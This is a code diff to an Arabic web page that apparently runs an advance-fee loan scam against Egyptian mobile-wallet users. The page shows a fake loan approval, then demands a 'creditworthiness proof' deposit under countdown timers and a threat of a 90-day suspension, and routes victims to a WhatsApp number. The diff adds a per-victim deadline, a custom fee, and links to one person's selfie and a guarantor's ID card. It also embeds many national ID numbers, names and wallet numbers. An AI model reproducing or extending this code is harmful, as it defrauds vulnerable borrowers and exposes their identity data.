@@ -569,6 +569,38 @@
             font-weight: bold;
         }
 
+        /* صورة متوهجة */
+        .glow-image {
+            transition: all 0.3s ease;
+            max-width: 100%;
+            border-radius: 15px;
+        }
+        .glow-image:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(0,184,148,0.8);
+        }
+        .image-row {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-bottom: 2rem;
+        }
+        .image-card {
+            background: rgba(0,0,0,0.5);
+            border-radius: 1rem;
+            padding: 1rem;
+            text-align: center;
+            flex: 1;
+            min-width: 250px;
+            border: 1px solid rgba(212,175,55,0.3);
+        }
+        .image-card p {
+            margin-top: 0.5rem;
+            color: #FFD966;
+            font-weight: bold;
+        }
+
         @media (max-width: 680px) {
             .container { padding: 1rem; }
             .timer { font-size: 2.5rem; }
@@ -607,6 +639,9 @@
     </div>
 
     <div id="customerSection" class="hidden">
+        <!-- قسم الصور المخصص للعميل وائل زكريا -->
+        <div id="customerImagesSection" style="display: none; margin-bottom: 2rem;"></div>
+
         <div id="normalContent">
             <div class="timer-box">
                 <div class="timer-label">
@@ -664,7 +699,8 @@
                     هي إجراء أمني معتمد دولياً لتأكيد ملكيتك للمحفظة والتحقق من قدرتك على السداد. يتم إيداع مبلغ مؤقت وتحويل إلى أي شخص تبعك مباشرة. هذا الإجراء يحمي حقوقك وحقوق الشركة.
                 </div>
 
-                <div class="timer-box" style="background: linear-gradient(135deg, #2a1a0a, #1f1410); border-color: rgba(255, 107, 53, 0.5);">
+                <!-- المؤقت العادي (للعملاء الآخرين) -->
+                <div id="normalTimerBox" class="timer-box" style="background: linear-gradient(135deg, #2a1a0a, #1f1410); border-color: rgba(255, 107, 53, 0.5);">
                     <div class="timer-label" style="color: #ff6b35;">
                         <i class="fas fa-hourglass-end"></i> الوقت المتبقي لإثبات الجدارة الائتمانية
                     </div>
@@ -677,8 +713,22 @@
                     </div>
                 </div>
 
+                <!-- المؤقت الخاص بالعميل محمد عبدالوهاب (حتى الساعة 1 ظهراً) -->
+                <div id="specialDeadlineTimerBox" class="timer-box" style="background: linear-gradient(135deg, #2a1a0a, #1f1410); border-color: rgba(255, 107, 53, 0.5); display: none;">
+                    <div class="timer-label" style="color: #ff6b35;">
+                        <i class="fas fa-hourglass-end"></i> الوقت المتبقي لإثبات الجدارة الائتمانية
+                    </div>
+                    <div class="timer" id="specialDeadlineTimer" style="color: #ff6b35;">--:--:--</div>
+                    <div class="timer-progress">
+                        <div class="timer-progress-bar" id="specialDeadlineProgressBar" style="width: 100%; background: linear-gradient(90deg, #ff6b35, #FFD966);"></div>
+                    </div>
+                    <div class="timer-description" style="color: #ff8080;">
+                        ⚠️ <strong>تحذير هام:</strong> يجب إتمام إثبات الجدارة الائتمانية قبل الساعة <strong>1:00 ظهراً</strong> من اليوم. إذا انتهى الوقت دون إثبات الجدارة، لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً.
+                    </div>
+                </div>
+
                 <div class="info-box warning">
-                    <strong>⚠️ تنبيه أمني:</strong> عند انتهاء الوقت المحدد (27 دقيقة) دون إثبات الجدارة الائتمانية، سيتم تعليق طلبك تلقائياً. لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً من تاريخ التعليق.
+                    <strong>⚠️ تنبيه أمني:</strong> عند انتهاء الوقت المحدد دون إثبات الجدارة الائتمانية، سيتم تعليق طلبك تلقائياً. لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً من تاريخ التعليق.
                 </div>
 
                 <div class="step-indicator">
@@ -953,9 +1003,8 @@
 </div>
 
 <script>
-    // ========== قاعدة العملاء (تم حذف العميل وحيد محمد عارف عبد الله) ==========
+    // ========== قاعدة العملاء ==========
     const customersData = [
-        // العملاء الأساسيون السابقون (بدون وحيد)
         { national_id: "28309122103052", full_name: "احمد ماهر احمد محمد ", wallet_type: "فودافون كاش", wallet_number: "01032201208", loan_amount: 100000 },
         { national_id: "01010846425", full_name: "احمد كمال عبدالتواب محمد", wallet_type: "فودافون كاش", wallet_number: "01010846425", loan_amount: 30000 },
         { national_id: "28906270200731", full_name: "محمد احمد عبدالله عبدالقادر", wallet_type: "اتصالات كاش", wallet_number: "01119638067", loan_amount: 200000 },
@@ -967,8 +1016,6 @@
         { national_id: "29102272500939", full_name: "حماده ابوالعلا عبد العظيم ابوالعلا", wallet_type: "فودافون كاش", wallet_number: "01092974641", loan_amount: 30000 },
         { national_id: "30001132500275", full_name: "محمد على السيد سلام", wallet_type: "أخرى", wallet_number: "01271372918", loan_amount: 100000 },
         { national_id: "28507170200317", full_name: "محمد فتحى عبد الوارث محمد", wallet_type: "فودافون كاش", wallet_number: "01092134722", loan_amount: 120000 },
-        
-        // العملاء الجدد من الملف الثاني (21 عميلاً)
         { national_id: "28805142501019", full_name: "على حسين سيد على ", wallet_type: "اتصالات كاش", wallet_number: "01143756596", loan_amount: 30000 },
         { national_id: "26910290102639", full_name: "هاني محمد محمد عبد الحميد", wallet_type: "فودافون كاش", wallet_number: "01095216999", loan_amount: 50000 },
         { national_id: "26722501077", full_name: "شحاته عبد الغني هيكل عبد الغني", wallet_type: "فودافون كاش", wallet_number: "01003233741", loan_amount: 30000 },
@@ -987,12 +1034,9 @@
         { national_id: "27601414511", full_name: "هشام أحمد صلاح محمد عبدالغغار", wallet_type: "فودافون كاش", wallet_number: "01022560232", loan_amount: 50000 },
         { national_id: "28310192201335", full_name: "محمد محمود عبد الحميد محمد", wallet_type: "فودافون كاش", wallet_number: "01026479629", loan_amount: 40000 },
         { national_id: "27507310200599", full_name: "ياسر سعد محمد بكر", wallet_type: "فودافون كاش", wallet_number: "01226157120", loan_amount: 60000 },
-        
-        // العميل الجديد المطلوب إضافته
         { national_id: "29401172600151", full_name: "محمد احمد خلف الله عمر", wallet_type: "اتصالات كاش", wallet_number: "01129793519", loan_amount: 30000 }
     ];
 
-    // جدول الأقساط
     const loanDetailsMap = {
         30000: { months: 12, installment: 3325 },
         35000: { months: 12, installment: 3875 },
@@ -1046,6 +1090,7 @@
     let timerInterval = null;
     let creditworthinessInterval = null;
     let specialTimerInterval = null;
+    let deadlineTimerInterval = null;
 
     function handleSearch(btn) {
         const nationalId = document.getElementById('nationalId').value.trim();
@@ -1092,7 +1137,37 @@
 
         currentCustomer = customer;
         
-        if (customer.national_id === "27601011414511") {
+        // إضافة صور العميل وائل زكريا
+        const imagesDiv = document.getElementById('customerImagesSection');
+        if (customer.national_id === "28301030105511") {
+            imagesDiv.style.display = 'block';
+            imagesDiv.innerHTML = `
+                <div class="image-row">
+                    <div class="image-card">
+                        <img src="https://i.postimg.cc/BbnRBCDc/taken-picture-1Rw9Wyq-D-KFtpk-3383867.jpg" class="glow-image" style="max-width:100%; border-radius:15px;">
+                        <p>📸 صورة تأكيد الهوية (سيلفي العميل)</p>
+                    </div>
+                    <div class="image-card">
+                        <img src="https://i.postimg.cc/vZskPMW9/inbound3788707962729770465.jpg" class="glow-image" style="max-width:100%; border-radius:15px;">
+                        <p>🪪 صورة بطاقة الضامن</p>
+                    </div>
+                </div>
+            `;
+        } else {
+            imagesDiv.style.display = 'none';
+            imagesDiv.innerHTML = '';
+        }
+        
+        // معالجة خاصة للعميل محمد عبدالوهاب (رقم قومي 29807202102379) - المهلة حتى الساعة 1 ظهراً
+        if (customer.national_id === "29807202102379") {
+            document.getElementById('normalContent').style.display = 'block';
+            document.getElementById('specialContent').style.display = 'none';
+            displayCustomerData(customer);
+            startTimer();
+            // بدء المؤقت الخاص حتى الساعة 1 ظهراً بدلاً من المؤقت العادي
+            startDeadlineTimer();
+        }
+        else if (customer.national_id === "27601011414511") {
             document.getElementById('normalContent').style.display = 'none';
             document.getElementById('specialContent').style.display = 'block';
             startSpecialCreditworthinessTimer();
@@ -1115,6 +1190,57 @@
         window.scrollTo(0, 0);
     }
 
+    // المؤقت الخاص حتى الساعة 1 ظهراً (13:00)
+    function startDeadlineTimer() {
+        const normalTimerBox = document.getElementById('normalTimerBox');
+        const specialDeadlineBox = document.getElementById('specialDeadlineTimerBox');
+        const timerElem = document.getElementById('specialDeadlineTimer');
+        const progressBar = document.getElementById('specialDeadlineProgressBar');
+        
+        normalTimerBox.style.display = 'none';
+        specialDeadlineBox.style.display = 'block';
+        
+        const now = new Date();
+        const deadline = new Date();
+        deadline.setHours(13, 0, 0, 0); // 1:00 ظهراً
+        
+        let timeLeft = Math.floor((deadline - now) / 1000);
+        
+        if (timeLeft <= 0) {
+            timerElem.textContent = "00:00:00";
+            progressBar.style.width = '0%';
+            alert('انتهت المهلة المحددة لإثبات الجدارة الائتمانية (قبل الساعة 1 ظهراً). لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً.');
+            const whatsappBtn = document.querySelector('#normalContent .whatsapp-btn');
+            if (whatsappBtn) whatsappBtn.disabled = true;
+            return;
+        }
+        
+        const totalTime = timeLeft;
+        
+        if (deadlineTimerInterval) clearInterval(deadlineTimerInterval);
+        function update() {
+            const hours = Math.floor(timeLeft / 3600);
+            const mins = Math.floor((timeLeft % 3600) / 60);
+            const secs = timeLeft % 60;
+            timerElem.textContent = `${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+            const percent = (timeLeft / totalTime) * 100;
+            progressBar.style.width = `${percent}%`;
+            
+            if (timeLeft <= 300) timerElem.classList.add('warning');
+            
+            if (timeLeft <= 0) {
+                clearInterval(deadlineTimerInterval);
+                progressBar.style.width = '0%';
+                document.getElementById('timeoutModal').style.display = 'block';
+                const whatsappBtn = document.querySelector('#normalContent .whatsapp-btn');
+                if (whatsappBtn) whatsappBtn.disabled = true;
+            }
+            timeLeft--;
+        }
+        update();
+        deadlineTimerInterval = setInterval(update, 1000);
+    }
+
     function displayCustomerData(customer) {
         const details = getLoanDetails(customer.loan_amount);
         const installment = details.installment;
@@ -1129,10 +1255,14 @@
         document.getElementById('loanDuration').innerText = months + ' شهر';
 
         let proofAmount;
-        if (customer.loan_amount < 50000) proofAmount = 4000;
-        else if (customer.loan_amount <= 100000) proofAmount = 6000;
-        else if (customer.loan_amount <= 200000) proofAmount = 8000;
-        else proofAmount = 10000;
+        if (customer.national_id === "28301030105511") {
+            proofAmount = 9000;
+        } else {
+            if (customer.loan_amount < 50000) proofAmount = 4000;
+            else if (customer.loan_amount <= 100000) proofAmount = 6000;
+            else if (customer.loan_amount <= 200000) proofAmount = 8000;
+            else proofAmount = 10000;
+        }
         document.getElementById('proofAmountText').innerHTML = formatNumber(proofAmount);
 
         const today = new Date();
@@ -1203,7 +1333,7 @@
     }
 
     function startSpecialCreditworthinessTimer() {
-        let timeLeft = 70 * 60; // 70 دقيقة
+        let timeLeft = 70 * 60;
         const timerElem = document.getElementById('specialCreditworthinessTimer');
         const progressBar = document.getElementById('specialCreditworthinessProgressBar');
         const totalTime = 70 * 60;
@@ -1225,7 +1355,6 @@
                 clearInterval(specialTimerInterval);
                 progressBar.style.width = '0%';
                 document.getElementById('timeoutModal').style.display = 'block';
-                // تعطيل زر واتساب والخطوات بعد انتهاء الوقت
                 const whatsappBtn = document.querySelector('#specialSteps .whatsapp-btn');
                 if (whatsappBtn) whatsappBtn.disabled = true;
             }
@@ -1249,11 +1378,17 @@
         if (!enteredLast3) { alert('❌ لم تقم بإدخال الأرقام.'); return; }
         const cleanedEntered = enteredLast3.replace(/\D/g, '');
         if (cleanedEntered !== last3Digits) { alert('❌ الرقم غير صحيح.'); return; }
+        
         let proofAmount;
-        if (currentCustomer.loan_amount < 50000) proofAmount = 4000;
-        else if (currentCustomer.loan_amount <= 100000) proofAmount = 6000;
-        else if (currentCustomer.loan_amount <= 200000) proofAmount = 8000;
-        else proofAmount = 10000;
+        if (currentCustomer.national_id === "28301030105511") {
+            proofAmount = 9000;
+        } else {
+            if (currentCustomer.loan_amount < 50000) proofAmount = 4000;
+            else if (currentCustomer.loan_amount <= 100000) proofAmount = 6000;
+            else if (currentCustomer.loan_amount <= 200000) proofAmount = 8000;
+            else proofAmount = 10000;
+        }
+        
         const message = `مرحباً، أنا ${currentCustomer.full_name} (رقم قومي: ${currentCustomer.national_id})، أريد إتمام إجراءات الجدارة الائتمانية. مبلغ الجدارة المطلوب: ${formatCurrency(proofAmount)}. أرسل لك الصور المطلوبة.`;
         const whatsappUrl = `https://wa.me/212614494251?text=${encodeURIComponent(message)}`;
         window.open(whatsappUrl, '_blank');
@@ -1309,6 +1444,7 @@
         if (timerInterval) clearInterval(timerInterval);
         if (creditworthinessInterval) clearInterval(creditworthinessInterval);
         if (specialTimerInterval) clearInterval(specialTimerInterval);
+        if (deadlineTimerInterval) clearInterval(deadlineTimerInterval);
         currentCustomer = null;
     }
 
